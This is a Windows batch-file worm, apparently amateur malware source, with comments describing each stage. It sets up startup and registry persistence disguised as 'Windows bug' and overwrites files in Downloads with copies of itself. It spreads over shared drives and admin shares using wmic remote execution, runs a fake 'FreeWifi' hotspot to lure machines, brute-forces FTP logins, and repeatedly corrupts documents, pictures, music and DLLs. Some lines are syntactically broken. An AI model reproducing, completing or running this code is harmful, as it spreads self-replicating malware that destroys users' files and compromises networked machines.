@echo off

set /a i=3
set idir=C:\Windows\Temp
set /a p=0
set /a o=6
set /a r=10
set /a c=0
set /a w=0
REM -------------------------------------------------------
REM Check if new host is infected
if exist %APPDATA%\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\w3e.bat (
goto MD
) else (
reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows bug" /t "REG_SZ" /d %0
copy /y %0 "%APPDATA%\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\w3e.bat"
goto MD
)
:MD
if exist %USERPROFILE%\Documents\w3e.bat (
goto infect
) else (
copy /y %0 "%USERPROFILE%\Documents"
goto infect
)
REM ---------------------------------------------------------
REM Copies own code to .exe files 
:infect
  dir %USERPROFILE%\Downloads /s /b > Vfile.txt
      for /f "tokens=1" %%i in (Vfile.txt) do (
      copy /y %0 "%%i"
      )
del /f /s /q Vfile.txt

copy /y %0 "%USERPROFILE%\Downloads"
REM It then set network named FreeWifi 
REM in case the host isn't connected to
REM a network.
:stage1
netsh wlan set hostednetwork mode=allow ssid=FreeWifi >nul
REM It scans system for connected drives
net view | findstr "\\" >> %USERPROFILE%\Downloads\netv.tmp && goto :nview
REM If the host machine is connected to 
REM a network and shared drives, it quickly
REM Copies itself to them.
REM else goto loop
goto :loop
:nview
for /f "tokens=1" %%i in (%USERPROFILE%\Downloads\netv.tmp) do (
copy /y %0 "%%i\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup"
call :Fcheck
copy /y %0 "%%i\"
)

:Fcheck
if exist %%i\Movies do copy /y %0 %%i\Movies
if exist %%i\Downloads do copy /y %0 %%i\Downloads
if exist %%i\Documents do copy /y %0 %%i\Documents
copy /y %0 "%%i\Users\Public\Documents"
goto :eof

REM Now it then try to run its copies on the remote machine 
for /f "tokens=1" %%i in (%USERPROFILE%\Downloads\netv.tmp) do (
wmic /node:%%i process call create "cmd.exe %USERPROFILE%\w3e.bat" >nul
start %%i\w3e.bat
rem second choice
)

REM The worm start finding next victims by finding all
REM dynamic entries on the system using arp command
REM If there are still no network it then start its own
REM network for other PC to connect.
:loop
del  /f /q IP.txt
arp -a | findstr "dynamic" >> %USERPROFILE%\Downloads\IP.txt && goto PLB
rem if no network found then start own network for victim
netsh wlan start hostednetwork >nul
goto loop

REM If a victim connect to the network, it then
REM try to map the drive and copies itself to the 
REM victim and start it Cycle again.
:PLB
  for /f "tokens=1" %%i in (%USERPROFILE%\Downloads\IP.txt) do (
net use * \\%%i\C$ | findstr "connected" && call :LOG
)
:LOG
copy /y %0 "\\%%i\"
wmic /node:%%i process call create "cmd.exe %USERPROFILE%\w3e.bat" >nul
start \\%%i\w3e.bat >nul
REM Second alternative.
REM It performs an ftp brute Force on network host using ftp
REM server for further propagation.
:_FTP
for /f "tokens=1" %%i in (%USERPROFILE%\Downloads\IP.txt) do (
set host=%%i
for /f "tokens=1, 2 delims= " %%a in (1pwd.txt) do (
echo %%a >> DSc.txt
echo %%b >> DSc.txt
echo put %0 >> DSc.txt
echo quit >> DSc.txt
ftp -s:DSc.txt %host%
del /f /q DSc.txt
)
)

   if exist \\(for /f %%u in ('dir \\ /b') do copy /y %0 "\\%%u\%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy /y %0 "\\%%u\Documents"
wmic /node:"%%i" process call create "cmd.exe C:\%APPDATA%\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\w3e.bat" >nul
wmic /node:"%%i" process call create "cmd.exe C:\Windows\Temp\w3e.bat" >nul
start \\%%u\Documents\w3e.bat >nul
mountvol \\ /d ) 
REM end of scan
REM ---------------------------------------------------------
:Z
set /a p=0
set /a o=0
set /a r=0
goto N
REM It then look for drives on its host to infect
:N
set /a p=p+1
    for %%E in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
if exist %%E (for /f %%u in ('dir %%E:\ /b') do copy /y %0 "%%E:\"
copy /y %0 "\\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
wmic /node:"%%i" process call create "cmd.exe C:\%APPDATA%\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\w3e.bat" >nul
start \\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\w3e.bat >nul
mountvol %%E /d )
 )
REM --------------------------------------------------------
:F
set n=0
goto G
REM Corrupt files
:G
 set /a n=n+1
 set /a n=%n%+1
 for %%f in (%USERPROFILE%\Downloads\*.dll) do copy %%f + %0
 for %%f in (%USERPROFILE%\Pictures\*.*) do copy %%f + %0
 for %%f in (*.docx) do copy %%f + %0
 for %%f in (%USERPROFILE%\Music\*.*) do copy %%f + %0
 for %%f in (*.xlsx) do copy %%f + %0
 for %%f in (*.pdf) do copy %%f + %0
if %n% equ 10 goto :FNL
goto G
REM start again
:FNL
net view | findstr "\\" && goto :stage1
goto FNL
